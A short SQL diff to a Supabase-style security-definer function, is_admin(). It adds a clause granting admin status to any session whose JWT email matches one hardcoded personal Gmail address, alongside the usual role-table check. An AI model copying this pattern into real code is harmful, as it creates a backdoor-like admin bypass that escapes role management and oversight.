@@ -19,15 +19,17 @@ create or replace function public.is_admin()
 returns boolean
 language sql
 security definer
-set search_path = public
+set search_path = public, auth
 stable
 as $$
-  select exists (
-    select 1
-    from public.user_roles
-    where user_id = auth.uid()
-      and role = 'admin'
-  );
+  select
+    coalesce((auth.jwt() ->> 'email') = 'yaojunxiong23@gmail.com', false)
+    or exists (
+      select 1
+      from public.user_roles
+      where user_id = auth.uid()
+        and role = 'admin'
+    );
 $$;
 
 -- ============================================================
